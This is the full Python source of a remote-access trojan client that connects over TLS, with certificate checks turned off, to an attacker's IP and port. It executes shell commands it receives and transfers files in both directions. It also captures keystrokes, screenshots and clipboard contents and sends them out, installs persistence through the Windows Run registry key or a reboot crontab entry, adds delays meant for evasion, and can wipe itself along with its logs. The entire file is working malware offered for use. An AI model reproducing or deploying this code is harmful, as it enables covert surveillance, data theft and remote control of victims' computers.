#!/usr/bin/env python3
import socket
import subprocess
import sys
import ssl
import os
import platform
import shutil
import base64
import random
import time
import datetime
import threading
import json
import glob
import fnmatch
from io import BytesIO

# Configuration
SHARED_SECRET = "SuperSecretToken123"

# Validate arguments
if len(sys.argv) != 3:
    print(f"Usage: python3 {sys.argv[0]} <attacker_ip> <attacker_port>")
    sys.exit(1)

attacker_ip = sys.argv[1]
attacker_port = int(sys.argv[2])

# Global variables for features
keylog_active = False
keylog_file = 'keylog.txt'
keylog_thread = None
LOG_FILE = f"client_log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

def log_event(event):
    """Log events to file"""
    try:
        with open(LOG_FILE, 'a') as log:
            log.write(f"[{datetime.datetime.now().isoformat()}] {event}\n")
    except Exception:
        pass

def safe_decode(data):
    """Safely decode base64 or regular data"""
    try:
        return base64.b64decode(data).decode('utf-8', errors='ignore')
    except Exception:
        return data.decode('utf-8', errors='ignore')

def safe_encode(data):
    """Safely encode data to base64"""
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.b64encode(data)

def random_delay():
    """Add random delay for evasion"""
    time.sleep(random.uniform(0, 2))

def keylogger_worker():
    """Keylogger thread worker"""
    try:
        try:
            from pynput import keyboard
        except ImportError as e:
            log_event(f"[!] pynput not installed: {e}")
            return
        with open(keylog_file, 'a') as log:
            def on_press(key):
                try:
                    if hasattr(key, 'char') and key.char:
                        log.write(str(key.char))
                    else:
                        log.write(f'<{key}>')
                    log.flush()
                except Exception as e:
                    log_event(f"[!] Keylogger on_press error: {e}")
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            while keylog_active:
                time.sleep(1)
            listener.stop()
    except Exception as e:
        log_event(f"[!] Keylogger worker error: {e}")

def execute_command(cmd):
    """Execute system command safely"""
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
                              stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = proc.communicate()
        return stdout + stderr if stdout or stderr else b'\n'
    except Exception as e:
        return f"Command execution error: {e}".encode()

def handle_file_transfer(ssl_sock, cmd_parts, is_upload=True):
    """Handle file upload/download operations"""
    try:
        if is_upload:
            remote_path = cmd_parts[1]
            size_bytes = ssl_sock.recv(8)
            size = int.from_bytes(size_bytes, 'big')
            
            b64data = b''
            while len(b64data) < size:
                chunk = ssl_sock.recv(min(4096, size - len(b64data)))
                if not chunk:
                    break
                b64data += chunk
            
            file_data = base64.b64decode(b64data)
            with open(remote_path, 'wb') as f:
                f.write(file_data)
            return safe_encode('[+] Upload successful')
        else:
            remote_path = cmd_parts[1]
            if not os.path.isfile(remote_path):
                ssl_sock.send((0).to_bytes(8, 'big'))
                return None
                
            with open(remote_path, 'rb') as f:
                file_data = f.read()
            b64data = base64.b64encode(file_data)
            ssl_sock.send(len(b64data).to_bytes(8, 'big'))
            random_delay()
            ssl_sock.sendall(b64data)
            return None
    except Exception as e:
        return safe_encode(f'[!] File transfer error: {e}')

def handle_persistence():
    """Handle persistence installation"""
    try:
        exe_path = os.path.abspath(sys.argv[0])
        system = platform.system().lower()
        
        if 'windows' in system:
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                   0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "ReverseShellClient", 0, 
                                winreg.REG_SZ, exe_path)
                winreg.CloseKey(key)
                return '[+] Persistence added to Windows registry'
            except Exception as e:
                return f'[!] Registry persistence error: {e}'
                
        elif 'linux' in system:
            try:
                from crontab import CronTab
                user_cron = CronTab(user=True)
                
                # Check if job already exists
                for job in user_cron:
                    if exe_path in job.command:
                        return '[+] Persistence already exists in crontab'
                
                job = user_cron.new(command=f"python3 {exe_path}")
                job.every_reboot()
                user_cron.write()
                return '[+] Persistence added to Linux crontab'
            except Exception as e:
                return f'[!] Crontab persistence error: {e}'
        else:
            return '[!] Persistence not supported on this OS'
    except Exception as e:
        return f'[!] Persistence error: {e}'

def handle_system_info():
    """Gather comprehensive system information"""
    try:
        info = {
            'hostname': socket.gethostname(),
            'platform': platform.platform(),
            'os': os.name,
            'release': platform.release(),
            'version': platform.version(),
            'architecture': platform.machine(),
            'python_version': platform.python_version(),
            'user': os.getenv('USER') or os.getenv('USERNAME', 'Unknown'),
            'uptime': 'N/A'
        }
        
        # Get uptime
        try:
            if os.name == 'nt':
                import ctypes
                GetTickCount64 = ctypes.windll.kernel32.GetTickCount64
                ms = GetTickCount64()
                info['uptime'] = f"{ms//1000} seconds"
            else:
                with open('/proc/uptime') as f:
                    uptime_seconds = float(f.readline().split()[0])
                info['uptime'] = f"{int(uptime_seconds)} seconds"
        except Exception:
            pass
            
        return json.dumps(info, indent=2)
    except Exception as e:
        return f'[!] System info error: {e}'

def main():
    """Main client execution"""
    try:
        # Setup SSL connection
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_sock = context.wrap_socket(s, server_hostname=attacker_ip)
        ssl_sock.connect((attacker_ip, attacker_port))
        
        # Send authentication token
        ssl_sock.send(SHARED_SECRET.encode())
        log_event(f"Connected to {attacker_ip}:{attacker_port}")

        # Send system info immediately after authentication
        try:
            sysinfo = handle_system_info()
            ssl_sock.send(safe_encode(f"SYSINFO::{sysinfo}"))
        except Exception as e:
            log_event(f"[!] Failed to send system info: {e}")

        global keylog_active, keylog_thread
        
        while True:
            try:
                data = ssl_sock.recv(1024)
                if not data:
                    break
                    
                decoded = safe_decode(data)
                log_event(f"Command received: {decoded}")
                
                if decoded.lower() == 'exit':
                    break
                
                # File operations
                if decoded.startswith('upload '):
                    cmd_parts = decoded.split(' ', 1)
                    resp = handle_file_transfer(ssl_sock, cmd_parts, is_upload=True)
                    if resp:
                        random_delay()
                        ssl_sock.send(resp)
                        
                elif decoded.startswith('download '):
                    cmd_parts = decoded.split(' ', 1)
                    handle_file_transfer(ssl_sock, cmd_parts, is_upload=False)
                
                # Persistence
                elif decoded.lower() == 'persist':
                    try:
                        resp = handle_persistence()
                        ssl_sock.send(resp.encode())
                    except Exception as e:
                        log_event(f"[!] Persistence error: {e}")
                        ssl_sock.send(f"[!] Persistence error: {e}".encode())
                
                # System information
                elif decoded == 'sysinfo':
                    resp = handle_system_info()
                    response = safe_encode(resp)
                    random_delay()
                    ssl_sock.send(response)
                
                # Keylogger operations
                elif decoded == 'keylog_start':
                    try:
                        if not keylog_active:
                            keylog_active = True
                            keylog_thread = threading.Thread(target=keylogger_worker, daemon=True)
                            keylog_thread.start()
                            resp = safe_encode('[+] Keylogger started')
                        else:
                            resp = safe_encode('[!] Keylogger already running')
                        random_delay()
                        ssl_sock.send(resp)
                    except Exception as e:
                        log_event(f"[!] Keylogger start error: {e}")
                        resp = safe_encode(f"[!] Keylogger start error: {e}")
                        ssl_sock.send(resp)
                
                elif decoded == 'keylog_stop':
                    try:
                        if keylog_active:
                            keylog_active = False
                            resp = safe_encode('[+] Keylogger stopped')
                        else:
                            resp = safe_encode('[!] Keylogger not running')
                        random_delay()
                        ssl_sock.send(resp)
                    except Exception as e:
                        log_event(f"[!] Keylogger stop error: {e}")
                        resp = safe_encode(f"[!] Keylogger stop error: {e}")
                        ssl_sock.send(resp)
                
                elif decoded == 'keylog_dump':
                    try:
                        if os.path.exists(keylog_file):
                            with open(keylog_file, 'rb') as f:
                                file_data = f.read()
                            b64data = base64.b64encode(file_data)
                            ssl_sock.send(len(b64data).to_bytes(8, 'big'))
                            random_delay()
                            ssl_sock.sendall(b64data)
                        else:
                            ssl_sock.send((0).to_bytes(8, 'big'))
                    except Exception as e:
                        log_event(f"[!] Keylog dump error: {e}")
                        ssl_sock.send((0).to_bytes(8, 'big'))
                
                # Screenshot
                elif decoded.startswith('screenshot '):
                    try:
                        try:
                            import pyautogui
                        except ImportError as e:
                            error_msg = f"[!] Screenshot error: pyautogui not installed: {e}"
                            log_event(error_msg)
                            ssl_sock.send((0).to_bytes(8, 'big'))
                            continue
                        screenshot = pyautogui.screenshot()
                        buf = BytesIO()
                        screenshot.save(buf, format='PNG')
                        file_data = buf.getvalue()
                        b64data = base64.b64encode(file_data)
                        ssl_sock.send(len(b64data).to_bytes(8, 'big'))
                        random_delay()
                        ssl_sock.sendall(b64data)
                    except Exception as e:
                        log_event(f"[!] Screenshot error: {e}")
                        ssl_sock.send((0).to_bytes(8, 'big'))
                
                # Clipboard access
                elif decoded == 'clipboard':
                    try:
                        try:
                            import pyperclip
                        except ImportError as e:
                            error_msg = f"[!] Clipboard error: pyperclip not installed: {e}"
                            log_event(error_msg)
                            ssl_sock.send((0).to_bytes(8, 'big'))
                            continue
                        clipboard_data = pyperclip.paste()
                        if clipboard_data:
                            b64data = base64.b64encode(clipboard_data.encode())
                            ssl_sock.send(len(b64data).to_bytes(8, 'big'))
                            random_delay()
                            ssl_sock.sendall(b64data)
                        else:
                            ssl_sock.send((0).to_bytes(8, 'big'))
                    except Exception as e:
                        log_event(f"[!] Clipboard error: {e}")
                        ssl_sock.send((0).to_bytes(8, 'big'))
                
                # Process listing
                elif decoded == 'ps':
                    try:
                        if os.name == 'nt':
                            out = subprocess.check_output('tasklist', shell=True, 
                                                       stderr=subprocess.STDOUT)
                        else:
                            out = subprocess.check_output('ps aux', shell=True, 
                                                       stderr=subprocess.STDOUT)
                        resp = safe_encode(out.decode('utf-8', errors='ignore'))
                        random_delay()
                        ssl_sock.send(resp)
                    except Exception as e:
                        resp = safe_encode(f'[!] PS error: {e}')
                        random_delay()
                        ssl_sock.send(resp)
                
                # Self-destruct
                elif decoded == 'selfdestruct':
                    try:
                        # Remove persistence
                        system = platform.system().lower()
                        exe_path = os.path.abspath(sys.argv[0])
                        
                        if 'windows' in system:
                            try:
                                import winreg
                                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                                   r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                                   0, winreg.KEY_SET_VALUE)
                                winreg.DeleteValue(key, "ReverseShellClient")
                                winreg.CloseKey(key)
                            except Exception:
                                pass
                        elif 'linux' in system:
                            try:
                                from crontab import CronTab
                                user_cron = CronTab(user=True)
                                jobs = [job for job in user_cron if exe_path in job.command]
                                for job in jobs:
                                    user_cron.remove(job)
                                user_cron.write()
                            except Exception:
                                pass
                        
                        # Delete logs
                        for log in glob.glob('client_log_*.txt'):
                            try:
                                os.remove(log)
                            except Exception:
                                pass
                        
                        # Send confirmation and exit
                        resp = safe_encode('[+] Self-destruct complete. Exiting.')
                        ssl_sock.send(resp)
                        time.sleep(0.5)
                        
                        # Overwrite and delete self
                        try:
                            with open(sys.argv[0], 'r+b') as f:
                                length = os.path.getsize(sys.argv[0])
                                f.write(os.urandom(length))
                            os.remove(sys.argv[0])
                        except Exception:
                            pass
                        
                        os._exit(0)
                    except Exception as e:
                        resp = safe_encode(f'[!] Self-destruct error: {e}')
                        ssl_sock.send(resp)
                
                # Default command execution
                else:
                    output = execute_command(decoded)
                    resp = safe_encode(output)
                    random_delay()
                    ssl_sock.send(resp)
                    log_event(f"Output sent: {output.decode('utf-8', errors='ignore')[:100]}...")
                    
            except Exception as e:
                log_event(f"Command processing error: {e}")
                continue
                
    except Exception as e:
        log_event(f"Connection error: {e}")
    finally:
        try:
            ssl_sock.close()
        except Exception:
            pass

if __name__ == "__main__":
    main()
